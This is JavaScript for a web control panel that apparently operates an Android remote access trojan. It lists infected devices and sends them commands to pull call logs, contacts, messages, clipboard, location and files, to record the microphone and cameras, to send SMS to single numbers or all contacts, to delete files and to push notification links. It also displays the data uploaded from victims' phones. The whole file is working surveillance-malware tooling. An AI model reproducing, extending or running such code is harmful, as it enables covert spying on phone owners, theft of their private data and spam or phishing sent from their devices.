const commands = {
    calls: { label: 'Calls', params: [] },
    contacts: { label: 'Contacts', params: [] },
    messages: { label: 'Messages', params: [] },
    apps: { label: 'Apps', params: [] },
    device_info: { label: 'Device Info', params: [] },
    clipboard: { label: 'Clipboard', params: [] },
    camera_main: { label: 'Main Camera', params: [] },
    camera_selfie: { label: 'Selfie Camera', params: [] },
    location: { label: 'Location', params: [] },
    vibrate: { label: 'Vibrate', params: [] },
    stop_audio: { label: 'Stop Audio', params: [] },
    send_message: { label: 'Send Message', params: [
        { name: 'number', label: 'Phone Number', type: 'text', placeholder: 'Enter phone number' },
        { name: 'message', label: 'Message', type: 'text', placeholder: 'Enter message' }
    ]},
    send_message_to_all: { label: 'Send Message to All', params: [
        { name: 'message', label: 'Message', type: 'text', placeholder: 'Enter message' }
    ]},
    file: { label: 'Get File', params: [
        { name: 'path', label: 'File Path', type: 'text', placeholder: 'e.g., DCIM/Camera' }
    ]},
    delete_file: { label: 'Delete File', params: [
        { name: 'path', label: 'File Path', type: 'text', placeholder: 'e.g., DCIM/Camera' }
    ]},
    microphone: { label: 'Microphone', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration', min: 1 }
    ]},
    rec_camera_main: { label: 'Record Main Camera', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration', min: 1 }
    ]},
    rec_camera_selfie: { label: 'Record Selfie Camera', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration', min: 1 }
    ]},
    toast: { label: 'Show Toast', params: [
        { name: 'message', label: 'Toast Message', type: 'text', placeholder: 'Enter toast message' }
    ]},
    show_notification: { label: 'Show Notification', params: [
        { name: 'title', label: 'Notification Title', type: 'text', placeholder: 'Enter title' },
        { name: 'link', label: 'Notification Link', type: 'text', placeholder: 'Enter link' }
    ]},
    play_audio: { label: 'Play Audio', params: [
        { name: 'link', label: 'Audio Link', type: 'text', placeholder: 'Enter direct audio link' }
    ]}
};

function showLoading() {
    document.getElementById('loading').classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loading').classList.add('hidden');
}

function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `fixed bottom-4 right-4 p-4 rounded-lg shadow-lg text-white ${type === 'error' ? 'bg-red-600' : 'bg-blue-600'}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.classList.add('opacity-0');
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function fetchDevices() {
    showLoading();
    fetch('/devices')
        .then(response => response.json())
        .then(data => {
            const devicesList = document.getElementById('devices-list');
            devicesList.innerHTML = '';
            if (data.devices.length === 0) {
                devicesList.innerHTML = '<p class="text-gray-600 text-center">No devices connected.</p>';
                hideLoading();
                return;
            }
            data.devices.forEach(device => {
                const card = document.createElement('div');
                card.className = 'device-card';
                card.innerHTML = `
                    <div class="flex items-center">
                        <i class="fas fa-mobile-alt text-blue-600 mr-2"></i>
                        <h3 class="text-lg font-semibold">${device.model}</h3>
                    </div>
                    <p><i class="fas fa-battery-half mr-1"></i>Battery: ${device.battery}</p>
                    <p><i class="fas fa-android mr-1"></i>Android Version: ${device.version}</p>
                    <p><i class="fas fa-sun mr-1"></i>Brightness: ${device.brightness}</p>
                    <p><i class="fas fa-signal mr-1"></i>Provider: ${device.provider}</p>
                    <button class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 mt-2 flex items-center"><i class="fas fa-terminal mr-2"></i>Execute Command</button>
                `;
                card.querySelector('button').onclick = () => showCommandModal(device.uuid, device.model);
                devicesList.appendChild(card);
            });
            hideLoading();
        })
        .catch(error => {
            hideLoading();
            showToast('Error fetching devices: ' + error.message, 'error');
        });
}

function fetchFiles() {
    showLoading();
    fetch('/files')
        .then(response => response.json())
        .then(data => {
            const filesList = document.getElementById('files-list');
            filesList.innerHTML = '';
            if (data.files.length === 0) {
                filesList.innerHTML = '<p class="text-gray-600 text-center">No files uploaded.</p>';
                hideLoading();
                return;
            }
            data.files.forEach(file => {
                const card = document.createElement('div');
                card.className = 'file-card';
                let preview = '';
                if (file.isImage) {
                    preview = `<img data-src="/files/${file.filename}" alt="${file.name}" class="file-preview lazy">`;
                } else if (file.isVideo) {
                    preview = `<video controls class="file-preview"><source src="/files/${file.filename}" type="${file.type}"></video>`;
                } else if (file.isAudio) {
                    preview = `<audio controls class="file-preview"><source src="/files/${file.filename}" type="${file.type}"></audio>`;
                } else if (file.isText) {
                    preview = `<a href="/files/${file.filename}" target="_blank" class="text-blue-500 hover:underline"><i class="fas fa-file-alt mr-1"></i>View Text</a>`;
                } else {
                    preview = `<a href="/files/${file.filename}" download class="text-blue-500 hover:underline"><i class="fas fa-download mr-1"></i>Download</a>`;
                }
                card.innerHTML = `
                    <div class="flex items-center">
                        <i class="fas ${file.isImage ? 'fa-image' : file.isVideo ? 'fa-video' : file.isAudio ? 'fa-file-audio' : 'fa-file'} text-blue-600 mr-2"></i>
                        <h3 class="text-lg font-semibold">${file.name}</h3>
                    </div>
                    <p><i class="fas fa-weight-hanging mr-1"></i>Size: ${(file.size / 1024).toFixed(2)} KB</p>
                    <p><i class="fas fa-clock mr-1"></i>Uploaded: ${new Date(file.uploadedAt).toLocaleString()}</p>
                    <div class="file-preview">${preview}</div>
                    <button class="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600 mt-2 flex items-center"><i class="fas fa-trash mr-2"></i>Delete</button>
                `;
                card.querySelector('button').onclick = () => deleteFile(file.filename);
                filesList.appendChild(card);
            });
            // Lazy load images
            document.querySelectorAll('.lazy').forEach(img => {
                img.src = img.dataset.src;
                img.classList.remove('lazy');
            });
            hideLoading();
        })
        .catch(error => {
            hideLoading();
            showToast('Error fetching files: ' + error.message, 'error');
        });
}

function showCommandModal(uuid, model) {
    const modal = document.getElementById('command-modal');
    const form = document.getElementById('command-form');
    const inputsDiv = document.getElementById('command-inputs');
    const commandType = document.getElementById('command-type');
    const commandUuid = document.getElementById('command-uuid');
    const commandDevice = document.getElementById('command-device');

    commandUuid.value = uuid;
    commandDevice.textContent = model;
    inputsDiv.innerHTML = `
        <div>
            <label class="block text-sm font-medium text-gray-700">Select Command</label>
            <select id="command-select" class="mt-1 block w-full border-gray-300 rounded-md shadow-sm">
                ${Object.entries(commands).map(([key, cmd]) => `<option value="${key}">${cmd.label}</option>`).join('')}
            </select>
        </div>
    `;

    document.getElementById('command-select').addEventListener('change', (e) => {
        const command = e.target.value;
        commandType.value = command;
        const params = commands[command].params;
        inputsDiv.innerHTML = `
            <div>
                <label class="block text-sm font-medium text-gray-700">Select Command</label>
                <select id="command-select" class="mt-1 block w-full border-gray-300 rounded-md shadow-sm">
                    ${Object.entries(commands).map(([key, cmd]) => `<option value="${key}" ${key === command ? 'selected' : ''}>${cmd.label}</option>`).join('')}
                </select>
            </div>
            ${params.map(param => `
                <div>
                    <label class="block text-sm font-medium text-gray-700">${param.label}</label>
                    <input type="${param.type}" name="${param.name}" placeholder="${param.placeholder}" ${param.min ? `min="${param.min}"` : ''} class="mt-1 block w-full border-gray-300 rounded-md shadow-sm" required>
                </div>
            `).join('')}
        `;
    });

    form.onsubmit = (e) => {
        e.preventDefault();
        const command = commandType.value;
        const params = {};
        let valid = true;
        commands[command].params.forEach(param => {
            const value = form.elements[param.name].value;
            if (param.type === 'number' && (isNaN(value) || value < (param.min || 0))) {
                showToast(`Invalid ${param.label}: Must be a number ${param.min ? `>= ${param.min}` : ''}`, 'error');
                valid = false;
            } else {
                params[param.name] = value;
            }
        });
        if (valid) {
            executeCommand(uuid, command, params);
            modal.classList.add('hidden');
        }
    };

    document.getElementById('cancel-command').onclick = () => modal.classList.add('hidden');
    modal.classList.add('modal-open');
    modal.classList.remove('hidden');
}

function executeCommand(uuid, command, params) {
    showLoading();
    fetch('/executeCommand', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uuid, command, params })
    })
        .then(response => response.json())
        .then(data => {
            hideLoading();
            showToast(data.message, data.status === 'success' ? 'info' : 'error');
        })
        .catch(error => {
            hideLoading();
            showToast('Error executing command: ' + error.message, 'error');
        });
}

function deleteFile(filename) {
    if (!confirm(`Are you sure you want to delete ${filename}?`)) return;
    showLoading();
    fetch(`/files/${filename}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            hideLoading();
            showToast(data.message, data.status === 'success' ? 'info' : 'error');
            fetchFiles();
        })
        .catch(error => {
            hideLoading();
            showToast('Error deleting file: ' + error.message, 'error');
        });
}

document.addEventListener('DOMContentLoaded', () => {
    fetchDevices();
    fetchFiles();
    setInterval(fetchDevices, 10000);
    setInterval(fetchFiles, 10000);
});
